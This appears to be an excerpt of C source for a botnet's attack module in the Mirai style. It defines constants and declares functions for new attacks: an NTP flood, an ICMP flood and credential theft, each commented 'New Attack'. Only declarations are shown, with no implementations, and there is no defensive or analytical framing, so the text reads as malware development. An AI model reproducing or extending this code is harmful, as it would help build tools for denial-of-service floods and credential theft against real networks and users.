...
#define ATK_VEC_NTP        11  /* NTP Flood */
#define ATK_VEC_ICMP        12  /* ICMP Flood */
#define ATK_VEC_CRED_THEFT        13  /* Credential Theft */
...
void attack_udp_ntp(uint8_t, struct attack_target *, uint8_t, struct attack_option *); // New Attack
...
void attack_icmp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *); // New Attack
void attack_cred_theft(uint8_t, struct attack_target *, uint8_t, struct attack_option *); // New Attack
